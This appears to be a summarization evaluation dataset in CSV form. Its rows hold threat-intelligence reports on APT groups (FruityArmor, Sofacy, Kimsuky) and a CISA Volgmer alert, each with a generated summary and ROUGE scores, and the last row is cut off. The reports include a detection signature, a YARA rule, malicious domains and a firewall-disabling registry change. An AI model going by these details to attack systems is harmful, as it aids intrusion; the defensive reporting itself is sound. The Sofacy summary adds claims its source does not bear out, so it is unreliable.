URL;TITLE;TEXT;LANG;ROUGE-1;ROUGE-2;ROUGE-L
https://securelist.com/windows-zero-day-exploit-used-in-targeted-attacks-by-fruityarmor-apt/76396/;Windows zero-day exploit used in targeted attacks by FruityArmor APT;"A few days ago, Microsoft published the ""critical"" MS16-120 security bulletin with fixes for vulnerabilities in Microsoft Windows, Microsoft Office, Skype for Business, Silverlight and Microsoft Lync.One of the vulnerabilities - CVE-2016-3393 - was reported to Microsoft by Kaspersky Lab in September 2016.Here's a bit of background on how this zero-day was discovered. A few of months ago, we deployed a new set of technologies in our products to identify and block zero-day attacks. These technologies proved their effectiveness earlier this year, when we discovered two Adobe Flash zero-day exploits - CVE-2016-1010 and CVE-2016-4171. Two Windows EoP exploits have also been found with the help of this technology. One is CVE-2016-0165. The other is CVE-2016-3393.Like most zero-day exploits found in the wild today, CVE-2016-3393 is used by an APT group we call FruityArmor. FruityArmor is perhaps a bit unusual due to the fact that it leverages an attack platform that is built entirely around PowerShell. The group's primary malware implant is written in PowerShell and all commands from the operators are also sent in the form of PowerShell scripts.In this report we describe the vulnerability that was used by this group to elevate privileges on a victim's machine. Please keep in mind that we will not be publishing all the details about this vulnerability because of the risk that other threat actors may use them in their attacks.Attack chain descriptionTo achieve remote code execution on a victim's machine, FruityArmor normally relies on a browser exploit. Since many modern browsers are built around sandboxes, a single exploit is generally not sufficient to allow full access to a targeted machine. Most of the recent attacks we've seen that rely on a browser exploit are combined with an EoP exploit, which allows for a reliable sandbox escape.In the case of FruityArmor, the initial browser exploitation is always followed by an EoP exploit. This comes in the form of a module, which runs directly in memory. The main goal of this module is to unpack a specially crafted TTF font containing the CVE-2016-3393 exploit. After unpacking, the module directly loads the code exploit from memory with the help of AddFontMemResourceEx. After successfully leveraging CVE-2016-3393, a second stage payload is executed with higher privileges to execute PowerShell with a meterpreter-style script that connects to the C&C.EOP zero-day detailsThe vulnerability is located in the cjComputeGLYPHSET_MSFT_GENERAL function from the Win32k.sys system module. This function parses the cmap table and fills internal structures. The CMAP structure looks like this:The most interesting parts of this structure are two arrays - endCount and startCount. The exploit contains the next cmap table with segments:To compute how much memory to allocate to internal structures, the function executes this code:After computing this number, the function allocates memory for structures in the following way:The problem is that if we compute the entire table, we will achieve an integer overflow and the cnt variable will contain an incorrect value.In kernel, we see the following picture:The code allocates memory only for 0x18 InternalStruct but then there is a loop for all the segments range (this value was extracted from the file directly):Using the cmap table, the v44 variable (index) could be controlled and, as a result, we get memory corruption. To achieve it, the attacker can do the following:Make an integer overflow in win32k!cjComputeGLYPHSET_MSFT_GENERAL Make a specific segment ranges in font file to access interesting memory.What about Windows 10? As most of you know, the font processing in Windows 10 is performed in a special user mode process with restricted privileges. This is a very good solution but the code has the same bug in the TTF processing.As a result, if you load/open this font exploit in Windows 10, you will see the crash of fontdrvhost.exe:Kaspersky Lab detects this exploit as:HEUR:Exploit.Win32.GenericPDM:Exploit.Win32.GenericWe would like to thank Microsoft for their swift response in closing this security hole.* More information about the FruityArmor APT group is available to customers of Kaspersky Intelligence Services. Contact: intelreports@kaspersky.com";The vulnerability is located in the cjComputeGLYPHSET_MSFT_GENERAL function from the Win32k.sys system module. This function parses the cmap table and fills internal structures. The CMAP structure looks like this:The most interesting parts of this structure are two arrays endCount and startCount. The exploit contains the next cmap table with segments:To compute how much memory to allocate to internal structures, the function executes this code:After computing this number, the function allocates memory for structures in the following way:The problem is that if we compute the entire table, we will achieve an integer overflow and the cnt variable will contain an incorrect value.In kernel, we see the following picture:The code allocates memory only for 0x18 InternalStruct but then there is a loop for all the segments range (this value was extracted from the file directly):Using the cmap table, the v44 variable (index) could be controlled and, as a result, we get memory corruption. To achieve it, the attacker can do the following:Make an integer overflow in win32k!cjComputeGLYPHSET_MSFT_GENERAL Make a specific segment ranges in font file to access interesting memory.What about Windows 10? As most of you know, the font processing in Windows 10 is performed in a special user mode process with restricted privileges. This is a very good solution but the code has the same bug in the TTF processing.As a result, if you load/open this font exploit in Windows 10, you will see the crash of fontdrvhost.exe:Kaspersky Lab detects this exploit as:HEUR:Exploit.Win32.GenericPDM:Exploit.Win32.GenericWe would like to thank Microsoft for their swift;en;{'r': 0.4492753623188406, 'p': 1.0, 'f': 0.619999995722};{'r': 0.3847376788553259, 'p': 0.9918032786885246, 'f': 0.5544100761557164};{'r': 0.4492753623188406, 'p': 1.0, 'f': 0.619999995722}
https://www.cisa.gov/news-events/alerts/2017/11/14/hidden-cobra-north-korean-trojan-volgmer;HIDDEN COBRA – North Korean Trojan: Volgmer;"Systems AffectedNetwork systemsOverviewThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a Trojan malware variant used by the North Korean government--commonly known as Volgmer. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.gov/hiddencobra.FBI has high confidence that HIDDEN COBRA actors are using the IP addresses--listed in this report's IOC files--to maintain a presence on victims' networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to North Korean government malicious cyber activity.This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with Volgmer malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the Volgmer malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.For a downloadable copy of IOCs, see:NCCIC conducted analysis on five files associated with or identified as Volgmer malware and produced a Malware Analysis Report (MAR). MAR-10135536-D examines the tactics, techniques, and procedures observed. For a downloadable copy of the MAR, see:MAR (.pdf)MAR IOCs (.stix)Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. Since at least 2013, HIDDEN COBRA actors have been observed using Volgmer malware in the wild to target the government, financial, automotive, and media industries.It is suspected that spear phishing is the primary delivery mechanism for Volgmer infections, however, HIDDEN COBRA actors use a suite of custom tools, some of which could also be used to initially compromise a system. Therefore, it is possible that additional HIDDEN COBRA malware may be present on network infrastructure compromised with VolgmerThe U.S. Government has analyzed Volgmer's infrastructure and have identified it on systems using both dynamic and static IP addresses. At least 94 static IP addresses were identified, as well as dynamic IP addresses registered across various countries. The greatest concentrations of dynamic IPs addresses are identified below by approximate percentage:India (772 IPs) 25.4 percentIran (373 IPs) 12.3 percentPakistan (343 IPs) 11.3 percentSaudi Arabia (182 IPs) 6 percentTaiwan (169 IPs) 5.6 percentThailand (140 IPs) 4.6 percentSri Lanka (121 IPs) 4 percentChina (82 IPs, including Hong Kong (12)) 2.7 percentVietnam (80 IPs) 2.6 percentIndonesia (68 IPs) 2.2 percentRussia (68 IPs) 2.2 percentTechnical DetailsAs a backdoor Trojan, Volgmer has several capabilities including: gathering system information, updating service registry keys, downloading and uploading files, executing commands, terminating processes, and listing directories. In one of the samples received for analysis, the US-CERT Code Analysis Team observed botnet controller functionality.Volgmer payloads have been observed in 32-bit form as either executables or dynamic-link library (.dll) files. The malware uses a custom binary protocol to beacon back to the command and control (C2) server, often via TCP port 8080 or 8088, with some payloads implementing Secure Socket Layer (SSL) encryption to obfuscate communications.Malicious actors commonly maintain persistence on a victim's system by installing the malware-as-a-service. Volgmer queries the system and randomly selects a service in which to install a copy of itself. The malware then overwrites the ServiceDLL entry in the selected service's registry entry. In some cases, HIDDEN COBRA actors give the created service a pseudo-random name that may be composed of various hardcoded words.Detection and ResponseThis alert's IOC files provide HIDDEN COBRA indicators related to Volgmer. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations' allocated IP address space, and--if found--take necessary measures to remove the malware.When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.Network Signatures and Host-Based RulesThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.Network Signaturesalert tcp any any -> any any (msg:""Malformed_UA"", content:""User-Agent: Mozillar/"", depth:500, sid:99999999,)YARA Rulesrule volgmer{meta: description = ""Malformed User Agent""strings: $s = ""Mozillar/""condition: (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s}ImpactA successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts includetemporary or permanent loss of sensitive or proprietary information,disruption to regular operations,financial losses incurred to restore systems and files, andpotential harm to an organization's reputation.SolutionMitigation StrategiesDHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.Restrict users' abilities (permissions) to install and run unwanted software applications, and apply the principle of ""least privilege"" to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see Recognizing and Avoiding Email Scams. Follow safe practices when browsing the web. See Good Security Habits and Safeguarding Your Data for additional details.Do not follow unsolicited web links in emails. See Avoiding Social Engineering and Phishing Attacks for more information.Response to Unauthorized Network AccessContact DHS or your local FBI office immediately. To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), FBI through a local field office, or the FBI's Cyber Division (CyWatch@fbi.gov or 855-292-3937).RevisionsNovember 14, 2017: Initial version";"Users and administrators should immediately flag activity associated with the Volgmer malware, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation. DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.Keep operating systems and software uptodate with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Maintain uptodate antivirus software, and scan all software downloaded from the Internet before executing. Restrict users' abilities (permissions) to install and run unwanted software applications, and apply the principle of ""least privilege"" to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network. Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see Recognizing and Avoiding Email Scams. Follow safe practices when browsing the web. See Good Security Habits and Safeguarding Your Data for additional details. Do not follow unsolicited web links in emails. See Avoiding Social Engineering and Phishing Attacks for more information.";en;{'r': 0.3, 'p': 0.9893617021276596, 'f': 0.4603960360332321};{'r': 0.24245283018867925, 'p': 0.9625468164794008, 'f': 0.38733986114124996};{'r': 0.2967741935483871, 'p': 0.9787234042553191, 'f': 0.45544554098372714}
https://securelist.com/a-slice-of-2017-sofacy-activity/83930/;A Slice of 2017 Sofacy Activity;"Sofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year.This high level of cyber-espionage activity goes back years. In 2011-2012, the group used a relatively tiny implant (known as ""Sofacy"" or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point.In 2013, the Sofacy group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others. We've seen quite a few versions of these implants, which were relatively widespread at some point or still are. In 2015 we noticed another wave of attacks which took advantage of a new release of the AZZY implant, largely undetected by antivirus products. The new wave of attacks included a new generation of USB stealers deployed by Sofacy, with initial versions dating to February 2015. It appeared to be geared exclusively towards high profile targets.Sofacy's reported presence in the DNC network alongside APT29 brought possibly the highest level of public attention to the group's activities in 2016, especially when data from the compromise was leaked and ""weaponized"". And later 2016, their focus turned towards the Olympics' and the World Anti-Doping Agency (WADA) and Court of Arbitration for Sports (CAS), when individuals and servers in these organizations were phished and compromised. In a similar vein with past CyberBerkut activity, attackers hid behind anonymous activist groups like ""anonpoland"", and data from victimized organizations were similarly leaked and ""weaponized"".This write-up will survey notables in the past year of 2017 Sofacy activity, including their targeting, technology, and notes on their infrastructure. No one research group has 100% global visibility, and our collected data is presented accordingly. Here, external APT28 reports on 2017 Darkhotel-style activity in Europe and Dealer's Choice spearphishing are of interest. From where we sit, 2017 Sofacy activity starts with a heavy focus on NATO and Ukrainian partners, coinciding with lighter interest in Central Asian targets, and finishing the second half of the year with a heavy focus on Central Asian targets and some shift further East.Dealer's ChoiceThe beginning of 2017 began with a slow cleanup following the Dealer's Choice campaign, with technical characteristics documented by our colleagues at Palo Alto in several stages at the end of 2016. The group spearphished targets in several waves with Flash exploits leading to their carberp based JHUHUGIT downloaders and further stages of malware. It seems that many folks did not log in and pull down their emails until Jan 2017 to retrieve the Dealer's Choice spearphish. Throughout these waves, we observed that the targets provided connection, even tangential, to Ukraine and NATO military and diplomatic interests.In multiple cases, Sofacy spoofs the identity of a target, and emails a spearphish to other targets of interest. Often these are military or military-technology and manufacturing related, and here, the DealersChoice spearphish is again NATO related:The global reach that coincided with this focus on NATO and the Ukraine couldn't be overstated. Our KSN data showed spearphishing targets geolocated across the globe into 2017.AM, AZ, FR, DE, IQ, IT, KG, MA, CH, UA, US, VNDealersChoice emails, like the one above, that we were able to recover from third party sources provided additional targeting insight, and confirmed some of the targeting within our KSN data:TR, PL, BA, AZ, KR, LV, GE, LV, AU, SE, BE0day Deployment(s)Sofacy kicked off the year deploying two 0day in a spearphish document, both a Microsoft Office encapsulated postscript type confusion exploit (abusing CVE-2017-0262) and an escalation of privilege use-after-free exploit (abusing CVE-2017-0263). The group attempted to deploy this spearphish attachment to push a small 30kb backdoor known as GAMEFISH to targets in Europe at the beginning of 2017. They took advantage of the Syrian military conflict for thematic content and file naming ""Trump's_Attack_on_Syria_English.docx"". Again, this deployment was likely a part of their focus on NATO targets.Light SPLM deployment in Central Asia and Consistent InfrastructureMeanwhile in early-to-mid 2017, SPLM/CHOPSTICK/XAgent detections in Central Asia provided a glimpse into ongoing focus on ex-Soviet republics in Central Asia. These particular detections are interesting because they indicate an attempted selective 2nd stage deployment of a backdoor maintaining filestealer, keylogger, and remoteshell functionality to a system of interest. As the latest revision of the backdoor, portions of SPLM didn't match previous reports on SPLM/XAgent while other similarities were maintained. SPLM 64-bit modules already appeared to be at version 4 of the software by May of the year. Targeting profiles included defense related commercial and military organizations, and telecommunications.Targeting included TR, KZ, AM, KG, JO, UK, UZHeavy Zebrocy deploymentsSince mid-November 2015, the threat actor referred to as ""Sofacy"" or ""APT28"" has been utilizing a unique payload and delivery mechanism written in Delphi and AutoIT. We collectively refer to this package and related activity as ""Zebrocy"" and had written a few reports on its usage and development by June 2017 - Sofacy developers modified and redeployed incremented versions of the malware. The Zebrocy chain follows a pattern: spearphish attachment -> compiled Autoit script (downloader) -> Zebrocy payload. In some deployments, we observed Sofacy actively developing and deploying a new package to a much smaller, specific subset of targets within the broader set.Targeting profiles, spearphish filenames, and lures carry thematic content related to visa applications and scanned images, border control administration, and various administrative notes. Targeting appears to be widely spread across the Middle East, Europe, and Asia:Business accounting practices and standardsScience and engineering centersIndustrial and hydrochemical engineering and standards/certificationMinistry of foreign affairsEmbassies and consulatesNational security and intelligence agenciesPress servicesTranslation servicesNGO - family and social serviceMinistry of energy and industryWe identified new MSIL components deployed by Zebrocy. While recent Zebrocy versioning was 7.1, some of the related Zebrocy modules that drop file-stealing MSIL modules we call Covfacy were v7.0. The components were an unexpected inclusion in this particular toolset. For example, one sent out to a handful of countries identifies network drives when they are added to target systems, and then RC4-like-encrypts and writes certain file metadata and contents to a local path for later exfiltration. The stealer searches for files 60mb and less with these extensions:.doc.docx.xls.xlsx.ppt.pptx.exe.zip.rarAt execution, it installs an application-defined Windows hook. The hook gets windows messages indicating when a network drive has been attached. Upon adding a network drive, the hook calls its ""RecordToFile"" file stealer method.Zebrocy spearphishing targets:AF, AM, AU, AZ, BD, BE, CN, DE, ES, FI, GE, IL, IN, JO, KW, KG, KZ, LB, LT, MN, MY, NL, OM, PK, PO, SA, ZA, SK, SE, CH, TJ, TM, TR, UA, UAE, UK, US, UZSPLM deployment in Central AsiaSPLM/CHOPSTICK components deployed throughout 2017 were native 64-bit modular C++ Windows COM backdoors supporting http over fully encrypted TLSv1 and TLSv1.2 communications, mostly deployed in the second half of 2017 by Sofacy. Earlier SPLM activity deployed 32-bit modules over unencrypted http (and sometimes smtp) sessions. In 2016 we saw fully functional, very large SPLM/X-Agent modules supporting OS X.The executable module continues to be part of a framework supporting various internal and external components communicating over internal and external channels, maintaining slightly morphed encryption and functionality per deployment. Sofacy selectively used SPLM/CHOPSTICK modules as second stage implants to high interest targets for years now. In a change from previous compilations, the module was structured and used to inject remote shell, keylogger, and filesystem add-ons into processes running on victim systems and maintaining functionality that was originally present within the main module.The newer SPLM modules are deployed mostly to Central Asian based targets that may have a tie to NATO in some form. These targets include foreign affairs government organizations both localized and abroad, and defense organizations' presence localized, located in Europe and also located in Afghanistan. One outlier SPLM target profile within our visibility includes an audit and consulting firm in Bosnia and Herzegovina.Minor changes and updates to the code were released with these deployments, including a new mutex format and the exclusive use of encrypted HTTP communications over TLS. The compiled code itself already is altered per deployment in multiple subtle ways, in order to stymie identification and automated analysis and accommodate targeted environments. Strings (c2 domains and functionality, error messages, etc) are custom encrypted per deployment.Targets: TR, KZ, BA, TM, AF, DE, LT, NLSPLM/CHOPSTICK/XAgent Modularity and InfrastructureThis subset of SPLM/CHOPSTICK activity leads into several small surprises that take us into 2018, to be discussed in further detail at SAS 2018. The group demonstrates malleability and innovation in maintaining and producing familiar SPLM functionality, but the pragmatic and systematic approach towards producing undetected or difficult-to-detect malware continues. Changes in the second stage SPLM backdoor are refined, making the code reliably modular.Infrastructure NotesSofacy set up and maintained multiple servers and c2 for varying durations, registering fairly recognizable domains with privacy services, registrars that accept bitcoin, fake phone numbers, phony individual names, and 1 to 1 email address to domain registration relationships. Some of this activity and patterns were publicly disclosed, so we expect to see more change in their process in 2018. Also, throughout the year and in previous years, researchers began to comment publicly on Sofacy's fairly consistent infrastructure setup.As always, attackers make mistakes and give away hints about what providers and registrars they prefer. It's interesting to note that this version of SPLM implements communications that are fully encrypted over HTTPS. As an example, we might see extraneous data in their SSL/TLS certificates that give away information about their provider or resources. Leading up to summer 2017, infrastructure mostly was created with PDR and Internet Domain Service BS Corp, and their resellers. Hosting mostly was provided at Fast Serv Inc and resellers, in all likelihood related to bitcoin payment processing.Accordingly, the server side certificates appear to be generated locally on VPS hosts that exclusively are paid for at providers with bitcoin merchant processing. One certificate was generated locally on what appeared to be a HP-UX box, and another was generated on ""8569985.securefastserver[.]com"" with an email address ""root@8569985.securefastserver[.]com"", as seen here for their nethostnet[.]com domain. This certificate configuration is ignored by the malware.In addition to other ip data, this data point suggested that Qhoster at https://www.qhoster[.]com was a VPS hosting reseller of choice at the time. It should be noted that the reseller accepted Alfa Click, PayPal, Payza, Neteller, Skrill, WebMoney, Perfect Money, Bitcoin, Litecoin, SolidTrust Pay, CashU, Ukash, OKPAY, EgoPay, paysafecard, Alipay, MG, Western Union, SOFORT Banking, QIWI, Bank transfer for payment.ConclusionSofacy, one of the most active APT we monitor, continues to spearphish their way into targets, reportedly widely phishes for credentials, and infrequently participates in server side activity (including host compromise with BeEF deployment, for example). KSN visibility and detections suggests a shift from their early 2017 high volume NATO spearphish targeting towards the middle east and Central Asia, and finally moving their focus further east into late 2017. Their operational security is good. Their campaigns appear to have broken out into subsets of activity and malware involving GAMEFISH, Zebrocy, and SPLM, to name a few. Their evolving and modified SPLM/CHOPSTICK/XAgent code is a long-standing part of Sofacy activity, however much of it is changing. We'll cover more recent 2018 change in their targeting and the malware itself at SAS 2018.With a group like Sofacy, once their attention is detected on a network, it is important to review logins and unusual administrator access on systems, thoroughly scan and sandbox incoming attachments, and maintain two factor authentication for services like email and vpn access. In order to identify their presence, not only can you gain valuable insight into their targeting from intelligence reports and gain powerful means of detections with hunting tools like YARA, but out-of-band processing with a solution like KATA is important.Technical AppendixRelated md58f9f697aa6697acee70336f66f2958371a4b9a6b321da199aa6d10180e889313842454b48f5f800029946b1555fba7fcd4a5d44184333442f5015699c2b8af281421419d1be31f1f9ea60e8ed87277dbb1d1a2c64474d2f6e7a5db71ccbafa31953c7321c4959655fdd53302550ce02d57601d717fcf358220340675f8d63c8a02b79c468c38c4312429a499fa4f6c8185cd38f9e2c9397a18013a8921841a04f8e92d8b5488ea76c40601c8f1a0879066b4fb539806ce27be184b6735584339e8e1fcf757fe06be13bead43eaa1338c953c7321c4959655fdd53302550ce02daa2aac4606405d61c7e53140d35d767185cd38f9e2c9397a18013a8921841a0457601d717fcf358220340675f8d63c8a16e1ca26bc66e30bfa52f8a08846613df8e92d8b5488ea76c40601c8f1a08790b137c809e3bf11f2f5d867a6f4215f95237e6dcbc6af50ef5f5211818522c46388009adca35560810ec220544e4fb6aa2163a33330ae5786d3e984db09b2d9d202b79c468c38c4312429a499fa4f6c81842454b48f5f800029946b1555fba7fcd4a5d44184333442f5015699c2b8af28b88633376fbb144971dcb503f72fd1928f9f697aa6697acee70336f66f295837b6f77273cbde76896a36e32b0c0540e11a4b9a6b321da199aa6d10180e8893131421419d1be31f1f9ea60e8ed87277db1a4b9a6b321da199aa6d10180e8893139b10685b774a783eabfecdb6119a8aa3aa34fb2e5849bff4144a1c98a8158970aced5525ba0d4f44ffd01c4db2730a34b1d1a2c64474d2f6e7a5db71ccbafa31b924ff83d9120d934bb49a7a2e3c4292cdb58c2999eeda58a9d0c70f910d1195d4a5d44184333442f5015699c2b8af28d6f2bf2066e053e58fe8bcd39cb2e9ad34dc9a69f33ba93e631cd5048d9f26241c6f8eba504f2f429abf362626545c79139c9ac0776804714ebe8b8d35a04641e228cd74103dc069663bb87d4f22d7d5bed5bc0a8aae2662ea5d2484f80c17608c3f5f1fff999bc783062dd50357be795882a8dd4446abd137c05d2451b85fea296c956fe429cedd1b64b78e6679712282f06d7157dd28a75f1fbb47728aea259a975e0ddd32c0deef1318c485358b20529424eae07677834a770aaa431e6c544cafde8fa7d9e67194d4edd4f2adb92bf6b2ef4daf1b78802548d3e6d4de7ba7ede5d82bb6775a9b1659dccb699fadcb116d2fc1665ce7524826a624be0ded1c20ff290b8393f006eaf4358f09f13e994b02dfdfd44df3c88b0ca8c2327843a4c789ec7537e300411d523aef74407a5e0b32e65caf653d77cab2a866ee2d9dbc27faa10d1bec1a25f66e88645c695016647edddf61954822ddb7ab3341f9a6c52f04b8eb993ca4a3d98607824a10acfb9fe3a0fb3304d749aeed2c3e2e5787eb62deab0e5d61d6bf9e0ba83d9e1d7e2b86b607fe63c76b3d808f84969cb1a781f62182cf0ab94b3c97b0261547dfc6cf504182aaa5575bb38bf584839beb6d51d79a21970cad03e22440ea66bd85931fRelated domainsnethostnet[.]comhostsvcnet[.]cometcrem[.]netmovieultimate[.]comnewfilmts[.]comfastdataexchange[.]orgliveweatherview[.]comanalyticsbar[.]organalyticstest[.]netlifeofmentalservice[.]commeteost[.]comrighttopregnantpower[.]comkiteim[.]orgadobe-flash-updates[.]orggeneralsecurityscan[.]comglobalresearching[.]orglvueton[.]comaudiwheel[.]comonline-reggi[.]comfsportal[.]netnetcorpscanprotect[.]commvband[.]netmvtband[.]netviters[.]orgtreepastwillingmoment[.]comsendmevideo[.]orgsatellitedeluxpanorama[.]comppcodecs[.]comencoder-info[.]tkwmdmediacodecs[.]compostlkwarn[.]comshcserv[.]comversiontask[.]comwebcdelivery[.]commiropc[.]orgsecurityprotectingcorp[.]comuniquecorpind[.]comappexsrv[.]netadobeupgradeflash[.]com";"Sofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year.This high level of cyberespionage activity goes back years. In 20112012, the group used a relatively tiny implant (known as ""Sofacy"" or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point.In 2013 we noticed another wave of attacks which took advantage of a new release Sofacy has been actively targeting NATO and Ukrainian military and diplomatic interests, as well as Central Asian exSoviet republics. The malware is deployed through spearphishing emails containing malicious attachments. Once the malware is installed on a victim's computer, it can record audio and video from the victim's webcam and microphone, as well as steal files from the victim's computer. Additionally, the malware can be used to install additional malware components on the victim's computer. The malware can also be used to gain access to the victim's online accounts, allowing the attacker";en;{'r': 0.13610586011342155, 'p': 0.8421052631578947, 'f': 0.23433685683958527};{'r': 0.08808553971486761, 'p': 0.7032520325203252, 'f': 0.15656108399441454};{'r': 0.13516068052930058, 'p': 0.8362573099415205, 'f': 0.23270951753934116}
https://securelist.com/the-kimsuky-operation-a-north-korean-apt/57915/;The “Kimsuky” Operation: A North Korean APT?;"For several months, we have been monitoring an ongoing cyber-espionage campaign against South Korean think-tanks. There are multiple reasons why this campaign is extraordinary in its execution and logistics. It all started one day when we encountered a somewhat unsophisticated spy program that communicated with its ""master"" via a public e-mail server. This approach is rather inherent to many amateur virus-writers and these malware attacks are mostly ignored.However, there were a few things that attracted our attention:The public e-mail server in question was Bulgarian - mail.bg.The compilation path string contained Korean hieroglyphs.These two facts compelled us take a closer look at this malware -- Korean compilers alongside Bulgarian e-mail command-and-control communications.The complete path found in the malware presents some Korean strings:D:rsh??UAC_dll(??)Releasetest.pdbThe ""rsh"" word, by all appearances, means a shortening of ""Remote Shell"" and the Korean words can be translated in English as ""attack"" and ""completion"", i.e.:D:rshATTACKUAC_dll(COMPLETION)Releasetest.pdbAlthough the full list of victims remains unknown, we managed to identify several targets of this campaign. According to our technical analysis, the attackers were interested in targeting following organizations"".The Sejong InstituteThe Sejong Institute is a non-profit private organization for public interest and a leading think tank in South Korea, conducting research on national security strategy, unification strategy, regional issues, and international political economy.Korea Institute For Defense Analyses (KIDA)KIDA is a comprehensive defense research institution that covers a wide range of defense-related issues. KIDA is organized into seven research centers: the Center for Security and Strategy, the Center for Military Planning, the Center for Human Resource Development, the Center for Resource Management, the Center for Weapon Systems Studies, the Center for Information System Studies, and the Center for Modeling and Simulation. KIDA also has an IT Consulting Group and various supporting departments. KIDA's mission is to contribute to rational defense policy-making through intensive and systematic research and analysis of defense issues.Ministry of UnificationThe Ministry of Unification is an executive department of the South Korean government responsible for working towards the reunification of Korea. Its major duties are: establishing North Korea Policy, coordinating inter-Korean dialogue, pursuing inter-Korean cooperation and educating the public on unification.Hyundai Merchant MarineHyundai Merchant Marine is a South Korean logistics company providing worldwide container shipping services.Some clues also suggest that computers belonging to ""The supporters of Korean Unification"" (http://www.unihope.kr/) were also targeted. Among the organizations we counted, 11 are based in South Korea and two entities reside in China.Partly because this campaign is very limited and highly targeted, we have not yet been able to identify how this malware is being distributed. The malicious samples we found are the early stage malware most often delivered by spear-phishing e-mails.Infecting a systemThe initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware. It does not maintain exports and simply delivers another encrypted library maintained in its resource section. This second library performs all the espionage functionality.When running on Windows 7, the malicious library uses the Metasploit Framework's open-source code Win7Elevate to inject malicious code into explorer.exe. In any case, be it Windows 7 or not, this malicious code decrypts its spying library from resources, saves it to disk with an apparently random but hardcoded name, for example, ~DFE8B437DD7C417A6D.TMP, in the user's temporary folder and loads this file as library.This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name -- either KBDLV2.DLL or AUTO.DLL, depending on the malware sample. Then the service is created for the service dll. Service names also can differ from version to version, we discovered the following names -- DriverManage, WebService and WebClientManager. These functions assure malware persistence in a compromised OS between system reboots.At this stage, the malware gathers information about the infected computer. This includes an output of the systeminfo command saved in the file oledvbs.inc by following the hardcoded path: C:Program FilesCommon FilesSystemOle DBoledvbs.inc. There is another function called - the malware creates a string containing computer and user names but this isn't used anywhere. By all appearances, this is a mistake by the malware author. Later on, we will come to a function where such a string could be pertinent but the malware is not able to find this data in the place where it should be. These steps are taken only if it's running on an infected system for the first time. At system startup, the malicious library performs spying activities when it confirms that it is loaded by the generic svchost.exe process.Spying modulesThere are a lot of malicious programs involved in this campaign but, strangely, they each implement a single spying function. Besides the basic library (KBDLV2.DLL / AUTO.DLL) that is responsible for common communication with its campaign master, we were able to find modules performing the following functions:Keystroke loggingDirectory listing collectionHWP document theftRemote control download and executionRemote control accessDisabling firewallAt system startup, the basic library disables the system firewall and any AhnLab firewall (a South Korean security product vendor) by zeroing out related values in registry:SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters 